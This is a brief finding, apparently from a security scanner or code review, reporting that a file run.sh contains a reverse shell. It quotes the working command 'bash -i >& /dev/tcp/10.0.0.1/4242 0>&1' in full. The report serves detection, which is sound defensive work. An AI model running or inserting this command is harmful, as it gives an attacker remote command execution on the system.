claims: Detected in `run.sh`. The code executes a reverse shell command (`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`), which attempts to establish a TCP connection to IP address 10.0.0.1 on port 4242, providing remote command execution capabilities to an attacker. This is a classic malicious pattern for gaining unauthorized access to the system.
